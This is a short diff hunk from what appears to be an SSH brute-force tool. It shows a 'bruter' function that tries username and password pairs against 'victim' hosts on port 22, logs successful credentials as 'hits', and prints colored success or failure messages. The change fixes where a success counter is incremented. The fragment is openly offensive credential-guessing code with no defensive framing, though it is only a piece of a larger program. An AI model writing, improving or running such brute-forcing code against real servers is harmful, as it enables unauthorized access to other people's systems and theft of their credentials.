@@ -182,12 +182,12 @@ def bruter():
                 if check_result == True:
                     hits(str('HOST: ') + str(victim) + ':22, USER: ' + str(user) + ', PASS: ' + str(passwd))
                     print(Fore.LIGHTGREEN_EX + '(!) SUCCESS (!) -->> hit on TARGET: ' + str(victim) + '\n')
+                    checks_hit += 1
                     break
                 else:
                     print(Fore.LIGHTRED_EX + '(!) FAIL FOR (!) -->> ' + str(victim) + ':' + str(user) + ':'
                           + str(passwd) + ' ...\n')
                     continue
-            checks_hit += 1
         except:
             print(Fore.LIGHTRED_EX + 'Attack on target: ' + str(victim) + ' failed ...\n')
             checks_bad += 1
